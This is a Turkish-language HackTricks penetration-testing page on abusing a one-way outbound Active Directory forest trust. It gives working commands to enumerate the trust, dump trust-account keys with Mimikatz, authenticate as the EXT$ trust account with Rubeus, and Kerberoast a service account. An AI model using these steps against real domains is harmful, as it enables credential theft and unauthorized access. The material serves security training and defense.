# Dış Orman Alanı - Tek Yönlü (Çıkış)

{{#include ../../banners/hacktricks-training.md}}

Bu senaryoda **alanınız** **farklı alanlardan** bir **prensipe** bazı **yetkiler** **güveniyor**.

## Sayım

### Çıkış Güveni
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Bir güvenlik açığı, iki alan arasında bir güven ilişkisi kurulduğunda ortaya çıkar; burada alan **A** ve alan **B** olarak tanımlanmıştır. Alan **B**, alan **A**'ya güvenini genişletir. Bu yapılandırmada, alan **B** için alan **A**'da özel bir hesap oluşturulur ve bu hesap, iki alan arasındaki kimlik doğrulama sürecinde kritik bir rol oynar. Alan **B** ile ilişkilendirilen bu hesap, alanlar arasında hizmetlere erişim için biletleri şifrelemek amacıyla kullanılır.

Burada anlaşılması gereken kritik nokta, bu özel hesabın şifresi ve hash'inin, alan **A**'daki bir Alan Denetleyicisinden bir komut satırı aracı kullanılarak çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut şudur:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu çıkarım, adının sonunda **$** ile belirtilen hesabın aktif olması ve **A** alanının "Domain Users" grubuna ait olması nedeniyle mümkündür; bu da bu grupla ilişkili izinleri miras almasını sağlar. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak **A** alanına kimlik doğrulaması yapmalarına olanak tanır.

**Uyarı:** Bu durumu, sınırlı izinlerle de olsa bir kullanıcı olarak **A** alanında bir yer edinmek için kullanmak mümkündür. Ancak, bu erişim **A** alanında numaralandırma yapmak için yeterlidir.

`ext.local` güvenen alan ve `root.local` güvenilen alan olduğunda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulacaktır. Belirli araçlar aracılığıyla, Kerberos güven ilişkisi anahtarlarını dökerek `root.local` içindeki `EXT$` kimlik bilgilerini açığa çıkarmak mümkündür. Bunu başarmak için kullanılan komut:
```bash
lsadump::trust /patch
```
Bunun ardından, çıkarılan RC4 anahtarını kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulamak için başka bir araç komutu kullanılabilir:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Bu kimlik doğrulama adımı, `root.local` içindeki hizmetleri listeleme ve hatta istismar etme olasılığını açar; örneğin, hizmet hesap kimlik bilgilerini çıkarmak için bir Kerberoast saldırısı gerçekleştirmek:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Açık metin güven ilişkisi parolasını toplama

Önceki akışta, **açık metin parolası** (aynı zamanda **mimikatz ile dökülen**) yerine güven ilişkisi hash'i kullanıldı.

Açık metin parolası, mimikatz'tan alınan \[ CLEAR ] çıktısını onaltılıdan dönüştürerek ve null byte'ları ‘\x00’ kaldırarak elde edilebilir:

![](<../../images/image (938).png>)

Bazen bir güven ilişkisi oluşturulurken, kullanıcı tarafından güvenlik için bir parola girilmesi gerekir. Bu gösterimde, anahtar orijinal güven ilişkisi parolasıdır ve dolayısıyla insan tarafından okunabilir. Anahtar döngüye girdiğinde (30 gün), açık metin insan tarafından okunabilir olmayacak ancak teknik olarak yine de kullanılabilir.

Açık metin parolası, güvenlik hesabı olarak normal kimlik doğrulama gerçekleştirmek için kullanılabilir; bu, güvenlik hesabının Kerberos gizli anahtarını kullanarak bir TGT talep etmenin bir alternatifidir. Burada, ext.local'dan Domain Admins üyeleri için root.local sorgulanıyor:

![](<../../images/image (792).png>)

## Referanslar

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
